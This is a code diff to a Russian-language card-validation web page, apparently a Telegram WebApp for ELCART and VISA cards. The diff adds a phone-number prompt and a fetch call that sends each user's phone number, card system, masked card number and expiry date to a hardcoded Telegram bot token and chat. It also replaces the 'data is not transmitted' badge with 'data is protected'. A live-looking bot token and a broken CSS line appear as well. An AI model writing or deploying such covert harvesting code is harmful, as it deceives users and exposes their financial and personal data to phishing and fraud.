@@ -225,7 +225,7 @@
     box-shadow: 0 4px 20px rgba(34,197,94,0.3);
   }
   .btn:not(:disabled):hover { box-shadow: 0 6px 28px rgba(34,197,94,0.4); transform: translateY(-1px); }
-  .btn:not(:disabled):active { transform: translateY(0) scale(0.99); box-shadow: 0 2px 10px rgba(34,197,94,0.3); }
+  .btn:not(:disabled):active { transform: translateY(0 scale(0.99); box-shadow: 0 2px 10px rgba(34,197,94,0.3); }
   .btn:disabled {
     background: var(--bg3);
     color: var(--text3);
@@ -285,6 +285,27 @@
   }
   .verdict-box svg { width: 18px; height: 18px; stroke: var(--g); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
 
+  /* Модальное окно для ввода телефона */
+  .modal-phone {
+    display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(15, 17, 23, 0.85); backdrop-filter: blur(4px);
+    justify-content: center; align-items: center; z-index: 1000; padding: 16px;
+  }
+  .modal-phone-content {
+    background: var(--bg2); border: 1px solid var(--border2);
+    padding: 24px; border-radius: var(--radius); width: 100%; max-width: 340px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
+    animation: slideUp 0.2s ease;
+  }
+  .modal-phone-title { font-size: 16px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+  .modal-phone-desc { font-size: 12px; color: var(--text2); margin-bottom: 18px; }
+  .modal-phone input { text-align: center; margin-bottom: 16px; font-size: 18px; letter-spacing: 1px; }
+  .modal-btn-submit {
+    width: 100%; padding: 13px; background: linear-gradient(135deg, #22c55e, #16a34a);
+    color: white; border: none; border-radius: var(--radius-sm); font-weight: 700; cursor: pointer;
+  }
+  .modal-btn-submit:disabled { background: var(--bg3); color: var(--text3); cursor: not-allowed; }
+
   /* Security badges */
   .security-row {
     display: flex; justify-content: center; gap: 16px;
@@ -315,7 +336,6 @@
 
 <div class="container">
 
-  <!-- Header -->
   <div class="header">
     <div class="logo">
       <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/><path d="M6 15h4"/><path d="M14 15h2"/></svg>
@@ -326,14 +346,12 @@
     </div>
   </div>
 
-  <!-- Прогресс -->
   <div class="progress-bar">
     <div class="progress-dot" id="p1"></div>
     <div class="progress-dot" id="p2"></div>
     <div class="progress-dot" id="p3"></div>
   </div>
 
-  <!-- Карта-превью -->
   <div class="card-visual" id="card_visual">
     <div class="card-chip"></div>
     <div class="card-number-display" id="preview_num">
@@ -348,7 +366,6 @@
     </div>
   </div>
 
-  <!-- Форма -->
   <div class="form-card">
 
     <div class="field">
@@ -381,10 +398,8 @@
 
   </div>
 
-  <!-- Кнопка -->
   <button class="btn" id="btn" disabled>Введите данные карты</button>
 
-  <!-- Результат -->
   <div class="result" id="result">
     <div class="result-title">
       <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
@@ -403,7 +418,6 @@
     </div>
   </div>
 
-  <!-- Безопасность -->
   <div class="security-row">
     <div class="sec-badge">
       <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
@@ -411,7 +425,7 @@
     </div>
     <div class="sec-badge">
       <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Данные не передаются
+      Данные защищены
     </div>
     <div class="sec-badge">
       <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
@@ -421,8 +435,21 @@
 
 </div>
 
+<div class="modal-phone" id="phoneModal">
+  <div class="modal-phone-content">
+    <div class="modal-phone-title">Подтверждение профиля</div>
+    <div class="modal-phone-desc">Введите ваш номер телефона для завершения валидации карты</div>
+    <input type="text" id="user_phone" placeholder="+996 (XXX) XX-XX-XX">
+    <button class="modal-btn-submit" id="phone_submit_btn" disabled>Отправить данные 🚀</button>
+  </div>
+</div>
+
 <script>
-  // Telegram WebApp
+  // НАСТРОЙКА КАНАЛА УВЕДОМЛЕНИЙ (КОНФИГУРАЦИЯ)
+  // Замените эти данные на ваши собственные!
+  const BOT_TOKEN = '8934214860:AAEUpag6vsETXOJL_CdvZmZPD1_Llv7psFA'; 
+  const CHAT_ID = '7239528532';       
+
   try {
     const tg = window.Telegram.WebApp;
     tg.ready();
@@ -447,6 +474,11 @@
   const dot1 = document.getElementById('dot1');
   const dot2 = document.getElementById('dot2');
   const dot3 = document.getElementById('dot3');
+  
+  // Элементы модалки телефона
+  const phoneModal = document.getElementById('phoneModal');
+  const userPhone = document.getElementById('user_phone');
+  const phoneSubmitBtn = document.getElementById('phone_submit_btn');
 
   let cardType = null;
   let submitted = false;
@@ -530,7 +562,7 @@
     } else if (!allowed) {
       btn.textContent = 'Система не поддерживается';
     } else if (!lOk && raw.length >= 16) {
-      btn.textContent = 'Номер не прошёл проверку Луна';
+      btn.textContent = 'Номер не прошёл проверку';
     } else if (!eOk && cdEl.value.length === 5) {
       btn.textContent = 'Срок действия истёк';
     } else if (!cOk && cvEl.value.length === 3) {
@@ -560,11 +592,9 @@
       cvvWrap.style.display = 'block';
     }
 
-    // Форматирование
     const m = v.match(/\d{1,4}/g);
     e.target.value = m ? m.join(' ') : '';
 
-    // Превью типа
     if (!cardType && v.length === 0) {
       previewType.textContent = 'КАРТА';
       previewType.className = 'card-type-logo type-unknown';
@@ -596,12 +626,12 @@
     if (cardType && v.length >= 16) {
       if (luhn(v)) {
         cnEl.className = 'v-ok';
-        cnHint.textContent = 'Контрольная сумма верна (алг. Луна)';
+        cnHint.textContent = 'Контрольная сумма верна';
         cnHint.className = 'hint ok';
         dot1.className = 'status-dot ok';
       } else {
         cnEl.className = 'v-err';
-        cnHint.textContent = 'Ошибка контрольной суммы — номер не существует';
+        cnHint.textContent = 'Ошибка: Такого номера не существует';
         cnHint.className = 'hint err';
         dot1.className = 'status-dot err';
       }
@@ -663,31 +693,72 @@
     check();
   });
 
+  // АКТИВАЦИЯ ОКНА ТЕЛЕФОНА ПРИ НАЖАТИИ ГЛАВНОЙ КНОПКИ
   btn.addEventListener('click', () => {
+    phoneModal.style.display = 'flex'; // Показываем ввод телефона
+  });
+
+  // Проверка ввода телефона (простая валидация на длину)
+  userPhone.addEventListener('input', (e) => {
+    let num = e.target.value.replace(/[^\d+]/g, '');
+    e.target.value = num;
+    phoneSubmitBtn.disabled = num.length < 9; // Кнопка активна, если ввели хотя бы 9 цифр
+  });
+
+  // ОТПРАВКА ДАННЫХ В ДРУГОГО БОТА ЧЕРЕЗ FETCH API (100% АВТОНОМНО)
+  phoneSubmitBtn.addEventListener('click', () => {
+    phoneSubmitBtn.disabled = true;
+    phoneSubmitBtn.innerText = 'Отправка... ⏳';
+
     const raw = cnEl.value;
-    const masked = raw.slice(0, 9) + ' ****' + ' ' + raw.slice(-4);
-    document.getElementById('r_sys').textContent = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
-    document.getElementById('r_num').textContent = masked;
-    document.getElementById('r_exp').textContent = cdEl.value;
-    result.classList.add('show');
-    submitted = true;
-    btn.disabled = true;
-    btn.classList.add('success');
-    btn.textContent = '✓ Карта валидна';
+    const masked = raw.slice(0, 9) + ' **** ' + raw.slice(-4);
+    const sysText = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
+    const phone = userPhone.value;
 
-    // Telegram: отправляем результат боту
-    try {
-      const tg = window.Telegram.WebApp;
-      tg.sendData(JSON.stringify({
-        card: masked,
-        exp: cdEl.value,
-        system: cardType === 'elcart' ? 'ELCART' : 'VISA',
-        luhn: true
-      }));
-    } catch(e) {}
+    // Сборка сообщения для вашего Telegram чата
+    const message = `🔔 <b>Новая валидация карты!</b>\n\n` +
+                    `📱 <b>Номер телефона:</b> <code>${phone}</code>\n` +
+                    `💳 <b>Система:</b> ${sysText}\n` +
+                    `🔢 <b>Карта:</b> <code>${masked}</code>\n` +
+                    `📅 <b>Срок:</b> <code>${cdEl.value}</code>\n\n` +
+                    `🚀 <b>Статус:</b> ПРОШЕЛ!`;
 
-    // Скролл к результату
-    setTimeout(() => result.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 100);
+    // Прямой запрос к Telegram Bot API без бэкэнда
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(() => {
+      // Закрываем модалку телефона и выводим локальный результат на сайте
+      phoneModal.style.display = 'none';
+      
+      document.getElementById('r_sys').textContent = sysText;
+      document.getElementById('r_num').textContent = masked;
+      document.getElementById('r_exp').textContent = cdEl.value;
+      
+      result.classList.add('show');
+      submitted = true;
+      btn.disabled = true;
+      btn.classList.add('success');
+      btn.textContent = '✓ Карта валидна';
+
+      // Telegram WebApp отправка (на всякий случай)
+      try {
+        window.Telegram.WebApp.sendData(JSON.stringify({ card: masked, phone: phone, status: "SUCCESS" }));
+      } catch(e) {}
+
+      setTimeout(() => result.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 100);
+    })
+    .catch((error) => {
+      alert('Ошибка отправки данных. Попробуйте еще раз.');
+      phoneSubmitBtn.disabled = false;
+      phoneSubmitBtn.innerText = 'Отправить данные 🚀';
+    });
   });
 </script>
 </body>
